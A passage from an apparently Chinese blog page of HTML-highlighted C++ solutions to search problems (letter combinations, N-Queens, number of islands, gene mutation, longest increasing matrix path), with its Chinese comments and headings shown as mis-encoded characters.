class="hljs-title">dfs</span><span class="hljs-params">(<span class="hljs-type">int</span> index, string str)</span> </span>&#123;<br>    <span class="hljs-keyword">if</span> (index == digits.<span class="hljs-built_in">length</span>()) &#123;<br>        ans[ans_size++] = str;  <span class="hljs-comment">// ä¿å­˜ç»“æœ</span><br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">char</span> ch : alphabet[digits[index]]) &#123;<br>        <span class="hljs-built_in">dfs</span>(index + <span class="hljs-number">1</span>, str + ch);<br>    &#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">solve</span><span class="hljs-params">()</span> </span>&#123;<br>    alphabet[<span class="hljs-string">&#x27;2&#x27;</span>] = <span class="hljs-string">&quot;abc&quot;</span>;<br>    alphabet[<span class="hljs-string">&#x27;3&#x27;</span>] = <span class="hljs-string">&quot;def&quot;</span>;<br>    alphabet[<span class="hljs-string">&#x27;4&#x27;</span>] = <span class="hljs-string">&quot;ghi&quot;</span>;<br>    alphabet[<span class="hljs-string">&#x27;5&#x27;</span>] = <span class="hljs-string">&quot;jkl&quot;</span>;<br>    alphabet[<span class="hljs-string">&#x27;6&#x27;</span>] = <span class="hljs-string">&quot;mno&quot;</span>;<br>    alphabet[<span class="hljs-string">&#x27;7&#x27;</span>] = <span class="hljs-string">&quot;pqrs&quot;</span>;<br>    alphabet[<span class="hljs-string">&#x27;8&#x27;</span>] = <span class="hljs-string">&quot;tuv&quot;</span>;<br>    alphabet[<span class="hljs-string">&#x27;9&#x27;</span>] = <span class="hljs-string">&quot;wxyz&quot;</span>;<br><br>    <span class="hljs-keyword">if</span> (digits.<span class="hljs-built_in">empty</span>()) <span class="hljs-keyword">return</span>;<br><br>    <span class="hljs-built_in">dfs</span>(<span class="hljs-number">0</span>, <span class="hljs-string">&quot;&quot;</span>);<br>    <br>    <span class="hljs-comment">// è¾“å‡ºæ‰€æœ‰ç»“æœ</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; ans_size; i++) &#123;<br>        cout &lt;&lt; ans[i] &lt;&lt; endl;<br>    &#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br>    cin &gt;&gt; digits;<br>    <span class="hljs-built_in">solve</span>();<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure><h4 id="n-çš‡åé—®é¢˜"><a href="#n-çš‡åé—®é¢˜" class="headerlink" title="n çš‡åé—®é¢˜"></a>n çš‡åé—®é¢˜</h4><p>ç»™ä½ ä¸€ä¸ªæ•´æ•° nï¼Œè¿”å›æ‰€æœ‰ä¸åŒçš„ n çš‡åé—®é¢˜ çš„è§£å†³æ–¹æ¡ˆã€‚ æ¯ä¸€ç§è§£æ³•åŒ…å«ä¸€ä¸ªä¸åŒçš„ n çš‡åé—®é¢˜çš„æ£‹å­æ”¾ç½®æ–¹æ¡ˆï¼Œè¯¥æ–¹æ¡ˆä¸­ â€˜Qâ€™ å’Œ â€˜.â€™ åˆ†åˆ«ä»£è¡¨äº†çš‡åå’Œç©ºä½ã€‚</p><p>è¾“å…¥ï¼šn &#x3D; 4<br>è¾“å‡ºï¼š[[â€œ.Q..â€,â€â€¦Qâ€,â€Qâ€¦â€,â€..Q.â€], [â€œ..Q.â€,â€Qâ€¦â€,â€â€¦Qâ€,â€.Q..â€]]<br>è§£é‡Šï¼šå¦‚ä¸Šå›¾æ‰€ç¤ºï¼Œ4 çš‡åé—®é¢˜å­˜åœ¨ä¸¤ä¸ªä¸åŒçš„è§£æ³•ã€‚</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unordered_map&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;cstring&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><br><span class="hljs-type">const</span> <span class="hljs-type">int</span> MAX_N = <span class="hljs-number">15</span>;  <span class="hljs-comment">// æœ€å¤§æ£‹ç›˜å¤§å°</span><br><span class="hljs-type">const</span> <span class="hljs-type">int</span> MAX_ANS = <span class="hljs-number">100</span>;  <span class="hljs-comment">// å‡è®¾æœ€å¤šæœ‰100ç§è§£æ³•</span><br><br><span class="hljs-type">int</span> n;<br><span class="hljs-type">int</span> ans_size = <span class="hljs-number">0</span>;  <span class="hljs-comment">// è§£æ³•çš„æ•°é‡</span><br><span class="hljs-type">int</span> p[MAX_N];  <span class="hljs-comment">// å­˜å‚¨æ¯è¡Œçš‡åçš„åˆ—ä½ç½®</span><br><span class="hljs-type">bool</span> used[MAX_N];  <span class="hljs-comment">// æ ‡è®°åˆ—æ˜¯å¦è¢«å ç”¨</span><br>unordered_map&lt;<span class="hljs-type">int</span>, <span class="hljs-type">bool</span>&gt; usedPlus;  <span class="hljs-comment">// æ ‡è®°ä¸»å¯¹è§’çº¿æ˜¯å¦è¢«å ç”¨</span><br>unordered_map&lt;<span class="hljs-type">int</span>, <span class="hljs-type">bool</span>&gt; usedMinus;  <span class="hljs-comment">// æ ‡è®°å‰¯å¯¹è§’çº¿æ˜¯å¦è¢«å ç”¨</span><br>string result[MAX_ANS][MAX_N];  <span class="hljs-comment">// å­˜å‚¨è§£æ³•ï¼Œæ¯ä¸ªè§£æ³•æ˜¯ä¸€ä¸ªæ£‹ç›˜çš„å¸ƒå±€</span><br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">dfs</span><span class="hljs-params">(<span class="hljs-type">int</span> row)</span> </span>&#123;<br>    <span class="hljs-keyword">if</span> (row == n) &#123;<br>        <span class="hljs-comment">// æ‰¾åˆ°ä¸€ä¸ªè§£æ³•ï¼Œå°†å…¶ä¿å­˜</span><br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; n; i++) &#123;<br>            <span class="hljs-function">string <span class="hljs-title">s</span><span class="hljs-params">(n, <span class="hljs-string">&#x27;.&#x27;</span>)</span></span>;<br>            s[p[i]] = <span class="hljs-string">&#x27;Q&#x27;</span>;<br>            result[ans_size][i] = s;<br>        &#125;<br>        ans_size++;<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> col = <span class="hljs-number">0</span>; col &lt; n; col++) &#123;<br>        <span class="hljs-keyword">if</span> (!used[col] &amp;&amp; !usedPlus[row + col] &amp;&amp; !usedMinus[row - col]) &#123;<br>            p[row] = col;<br>            used[col] = <span class="hljs-literal">true</span>;<br>            usedPlus[row + col] = <span class="hljs-literal">true</span>;<br>            usedMinus[row - col] = <span class="hljs-literal">true</span>;<br>            <span class="hljs-built_in">dfs</span>(row + <span class="hljs-number">1</span>);<br>            usedMinus[row - col] = <span class="hljs-literal">false</span>;<br>            usedPlus[row + col] = <span class="hljs-literal">false</span>;<br>            used[col] = <span class="hljs-literal">false</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">solveNQueens</span><span class="hljs-params">()</span> </span>&#123;<br>    <span class="hljs-built_in">dfs</span>(<span class="hljs-number">0</span>);<br>    <span class="hljs-comment">// è¾“å‡ºæ‰€æœ‰è§£æ³•</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; ans_size; i++) &#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">0</span>; j &lt; n; j++) &#123;<br>            cout &lt;&lt; result[i][j] &lt;&lt; endl;<br>        &#125;<br>        cout &lt;&lt; endl;<br>    &#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br>    cin &gt;&gt; n;<br>    <span class="hljs-built_in">solveNQueens</span>();<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure><h4 id="å²›å±¿æ•°é‡"><a href="#å²›å±¿æ•°é‡" class="headerlink" title="å²›å±¿æ•°é‡"></a>å²›å±¿æ•°é‡</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;queue&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;cstring&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><br><span class="hljs-type">const</span> <span class="hljs-type">int</span> MAX_M = <span class="hljs-number">100</span>;  <span class="hljs-comment">// æœ€å¤§è¡Œæ•°</span><br><span class="hljs-type">const</span> <span class="hljs-type">int</span> MAX_N = <span class="hljs-number">100</span>;  <span class="hljs-comment">// æœ€å¤§åˆ—æ•°</span><br><br><span class="hljs-type">int</span> m, n;<br><span class="hljs-type">char</span> grid[MAX_M][MAX_N];  <span class="hljs-comment">// ç”¨é™æ€æ•°ç»„è¡¨ç¤ºç½‘æ ¼</span><br><span class="hljs-type">bool</span> visited[MAX_M][MAX_N];  <span class="hljs-comment">// ç”¨é™æ€æ•°ç»„è¡¨ç¤ºè®¿é—®æ ‡è®°</span><br><br><span class="hljs-type">const</span> <span class="hljs-type">int</span> dx[<span class="hljs-number">4</span>] = &#123;<span class="hljs-number">-1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>&#125;;<br><span class="hljs-type">const</span> <span class="hljs-type">int</span> dy[<span class="hljs-number">4</span>] = &#123;<span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">-1</span>, <span class="hljs-number">0</span>&#125;;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">bfs</span><span class="hljs-params">(<span class="hljs-type">int</span> sx, <span class="hljs-type">int</span> sy)</span> </span>&#123;<br>    queue&lt;pair&lt;<span class="hljs-type">int</span>, <span class="hljs-type">int</span>&gt;&gt; q;<br>    q.<span class="hljs-built_in">push</span>(&#123;sx, sy&#125;);<br>    visited[sx][sy] = <span class="hljs-literal">true</span>;<br>    <span class="hljs-keyword">while</span> (!q.<span class="hljs-built_in">empty</span>()) &#123;<br>        <span class="hljs-type">int</span> x = q.<span class="hljs-built_in">front</span>().first;<br>        <span class="hljs-type">int</span> y = q.<span class="hljs-built_in">front</span>().second;<br>        q.<span class="hljs-built_in">pop</span>();<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">4</span>; i++) &#123;<br>            <span class="hljs-type">int</span> nx = x + dx[i];<br>            <span class="hljs-type">int</span> ny = y + dy[i];<br>            <span class="hljs-keyword">if</span> (nx &lt; <span class="hljs-number">0</span> || nx &gt;= m || ny &lt; <span class="hljs-number">0</span> || ny &gt;= n) <span class="hljs-keyword">continue</span>;<br>            <span class="hljs-keyword">if</span> (grid[nx][ny] != <span class="hljs-string">&#x27;1&#x27;</span>) <span class="hljs-keyword">continue</span>;<br>            <span class="hljs-keyword">if</span> (visited[nx][ny]) <span class="hljs-keyword">continue</span>;<br>            q.<span class="hljs-built_in">push</span>(&#123;nx, ny&#125;);<br>            visited[nx][ny] = <span class="hljs-literal">true</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">numIslands</span><span class="hljs-params">()</span> </span>&#123;<br>    <span class="hljs-type">int</span> ans = <span class="hljs-number">0</span>;<br>    <span class="hljs-built_in">memset</span>(visited, <span class="hljs-literal">false</span>, <span class="hljs-built_in">sizeof</span>(visited));  <span class="hljs-comment">// åˆå§‹åŒ–è®¿é—®æ ‡è®°</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; m; i++) &#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">0</span>; j &lt; n; j++) &#123;<br>            <span class="hljs-keyword">if</span> (grid[i][j] == <span class="hljs-string">&#x27;1&#x27;</span> &amp;&amp; !visited[i][j]) &#123;<br>                ans++;<br>                <span class="hljs-built_in">bfs</span>(i, j);<br>            &#125;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> ans;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br>    cin &gt;&gt; m &gt;&gt; n;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; m; i++) &#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">0</span>; j &lt; n; j++) &#123;<br>            cin &gt;&gt; grid[i][j];<br>        &#125;<br>    &#125;<br>    cout &lt;&lt; <span class="hljs-built_in">numIslands</span>() &lt;&lt; endl;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure><h4 id="åŸºå› çªå˜é—®é¢˜"><a href="#åŸºå› çªå˜é—®é¢˜" class="headerlink" title="åŸºå› çªå˜é—®é¢˜"></a>åŸºå› çªå˜é—®é¢˜</h4><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unordered_set&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unordered_map&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;queue&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;cstring&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><br><span class="hljs-type">const</span> <span class="hljs-type">int</span> MAX = <span class="hljs-number">1e4</span>; <span class="hljs-comment">// å‡è®¾å­—å…¸ä¸­æœ€å¤šæœ‰ 10000ä¸ªå…ƒç´ </span><br>unordered_set&lt;string&gt; hasBank;  <span class="hljs-comment">// å­˜å‚¨æ‰€æœ‰çš„å˜æ¢å­—ç¬¦ä¸²</span><br>unordered_map&lt;string, <span class="hljs-type">int</span>&gt; depth;  <span class="hljs-comment">// è®°å½•æ¯ä¸ªå­—ç¬¦ä¸²çš„æœ€çŸ­å˜æ¢æ¬¡æ•°</span><br><br><span class="hljs-comment">// å­—ç¬¦é›†å¯¹åº”çš„å­—ç¬¦æ•°ç»„</span><br><span class="hljs-type">const</span> <span class="hljs-type">char</span> gene[<span class="hljs-number">4</span>] = &#123;<span class="hljs-string">&#x27;A&#x27;</span>, <span class="hljs-string">&#x27;C&#x27;</span>, <span class="hljs-string">&#x27;G&#x27;</span>, <span class="hljs-string">&#x27;T&#x27;</span>&#125;;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">minMutation</span><span class="hljs-params">(<span class="hljs-type">char</span> start[<span class="hljs-number">9</span>], <span class="hljs-type">char</span> end[<span class="hljs-number">9</span>], <span class="hljs-type">char</span> bank[][<span class="hljs-number">9</span>], <span class="hljs-type">int</span> bankSize)</span> </span>&#123;<br>    <span class="hljs-comment">// å°†æ‰€æœ‰çš„åŸºå› æ”¾å…¥å­—å…¸</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; bankSize; i++) &#123;<br>        hasBank.<span class="hljs-built_in">insert</span>(bank[i]);<br>    &#125;<br>    <span class="hljs-comment">// å¦‚æœç›®æ ‡å­—ç¬¦ä¸²ä¸åœ¨å­—å…¸ä¸­ï¼Œç›´æ¥è¿”å› -1</span><br>    <span class="hljs-keyword">if</span> (hasBank.<span class="hljs-built_in">find</span>(end) == hasBank.<span class="hljs-built_in">end</span>()) <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>    <span class="hljs-comment">// BFS åˆå§‹åŒ–</span><br>    queue&lt;string&gt; q;<br>    q.<span class="hljs-built_in">push</span>(start);<br>    depth[start] = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">while</span> (!q.<span class="hljs-built_in">empty</span>()) &#123;<br>        string s = q.<span class="hljs-built_in">front</span>();<br>        q.<span class="hljs-built_in">pop</span>();<br>        <span class="hljs-comment">// éå†æ¯ä¸ªä½ç½®</span><br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">8</span>; i++) &#123;<br>            <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">0</span>; j &lt; <span class="hljs-number">4</span>; j++) &#123;<br>                <span class="hljs-keyword">if</span> (s[i] != gene[j]) &#123;<br>                    string ns = s;<br>                    ns[i] = gene[j];<br>                    <span class="hljs-comment">// å¦‚æœæ–°å­—ç¬¦ä¸²åœ¨å­—å…¸ä¸­ï¼Œä¸”å°šæœªè®¿é—®è¿‡</span><br>                    <span class="hljs-keyword">if</span> (hasBank.<span class="hljs-built_in">find</span>(ns) != hasBank.<span class="hljs-built_in">end</span>() &amp;&amp; depth.<span class="hljs-built_in">find</span>(ns) == depth.<span class="hljs-built_in">end</span>()) &#123;<br>                        depth[ns] = depth[s] + <span class="hljs-number">1</span>;<br>                        q.<span class="hljs-built_in">push</span>(ns);<br>                        <br>                        <span class="hljs-comment">// æ‰¾åˆ°ç›®æ ‡å­—ç¬¦ä¸²ï¼Œè¿”å›æœ€çŸ­å˜æ¢æ­¥éª¤</span><br>                        <span class="hljs-keyword">if</span> (ns == end) <span class="hljs-keyword">return</span> depth[ns];<br>                    &#125;<br>                &#125;<br>            &#125;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br>    <span class="hljs-comment">// ä»è¾“å…¥ä¸­è¯»å–æ•°æ®</span><br>    <span class="hljs-type">char</span> start[<span class="hljs-number">9</span>], end[<span class="hljs-number">9</span>];<br>    cin &gt;&gt; start &gt;&gt; end;<br>    <br>    <span class="hljs-type">int</span> bankSize;<br>    cin &gt;&gt; bankSize;<br>    <br>    <span class="hljs-type">char</span> bank[bankSize][<span class="hljs-number">9</span>];<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; bankSize; i++) &#123;<br>        cin &gt;&gt; bank[i];<br>    &#125;<br><br>    cout &lt;&lt; <span class="hljs-built_in">minMutation</span>(start, end, bank, bankSize) &lt;&lt; endl;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure><h4 id="çŸ©é˜µä¸­çš„æœ€é•¿é€’å¢è·¯å¾„"><a href="#çŸ©é˜µä¸­çš„æœ€é•¿é€’å¢è·¯å¾„" class="headerlink" title="çŸ©é˜µä¸­çš„æœ€é•¿é€’å¢è·¯å¾„"></a><strong>çŸ©é˜µä¸­çš„æœ€é•¿é€’å¢è·¯å¾„</strong></h4><p>matrix &#x3D; [<br>  [9,9,4],<br>  [6,6,8],<br>  [2,1,1]<br>]</p><p><strong>æœ€é•¿è·¯å¾„è®¡ç®—</strong>ï¼šé€šè¿‡ BFS éå†æ‰€æœ‰èŠ‚ç‚¹ï¼Œè®°å½•æ¯ä¸ªèŠ‚ç‚¹çš„æœ€é•¿é€’å¢è·¯å¾„é•¿åº¦ï¼Œæœ€ç»ˆè·å–æœ€å¤§å€¼ä½œä¸ºç»“æœã€‚</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;vector&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;queue&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;algorithm&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><br><span class="hljs-type">const</span> <span class="hljs-type">int</span> MAX = <span class="hljs-number">100</span>;  <span class="hljs-comment">// å‡è®¾æœ€å¤§çŸ©é˜µä¸º100x100</span><br><span class="hljs-type">int</span> m, n;  <span class="hljs-comment">// çŸ©é˜µçš„è¡Œåˆ—æ•°</span><br><span class="hljs-type">int</span> matrix[MAX][MAX];<br>vector&lt;<span class="hljs-type">int</span>&gt; to[MAX * MAX];  <span class="hljs-comment">// é‚»æ¥è¡¨</span><br><span class="hljs-type">int</span> deg[MAX * MAX];  <span class="hljs-comment">// èŠ‚ç‚¹çš„å…¥åº¦</span><br><span class="hljs-type">int</span> dist[MAX * MAX];  <span class="hljs-comment">// ä»æ¯ä¸ªèŠ‚ç‚¹å‡ºå‘çš„æœ€é•¿è·¯å¾„</span><br><span class="hljs-type">int</span> dx[<span class="hljs-number">4</span>] = &#123;<span class="hljs-number">-1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>&#125;;<br><span class="hljs-type">int</span> dy[<span class="hljs-number">4</span>] = &#123;<span class="hljs-number">0</span>, <span class="hljs-number">-1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>&#125;;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">addEdge</span><span class="hljs-params">(<span class="hljs-type">int</span> u, <span class="hljs-type">int</span> v)</span> </span>&#123;<br>    deg[v]++;<br>    to[u].<span class="hljs-built_in">push_back</span>(v);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">num</span><span class="hljs-params">(<span class="hljs-type">int</span> i, <span class="hljs-type">int</span> j)</span> </span>&#123;<br>    <span class="hljs-keyword">return</span> i * n + j;  <span class="hljs-comment">// å°†äºŒç»´åæ ‡è½¬æ¢ä¸ºä¸€ç»´ç¼–å·</span><br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">valid</span><span class="hljs-params">(<span class="hljs-type">int</span> i, <span class="hljs-type">int</span> j)</span> </span>&#123;<br>    <span class="hljs-keyword">return</span> i &gt;= <span class="hljs-number">0</span> &amp;&amp; i &lt; m &amp;&amp; j &gt;= <span class="hljs-number">0</span> &amp;&amp; j &lt; n;  <span class="hljs-comment">// åˆ¤æ–­æ˜¯å¦åœ¨çŸ©é˜µå†…</span><br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">longestIncreasingPath</span><span class="hljs-params">()</span> </span>&#123;<br>    <span class="hljs-comment">// æ„å»ºå›¾</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; m; i++) &#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">0</span>; j &lt; n; j++) &#123;<br>            <span class="hljs-keyword">for</span> (<span 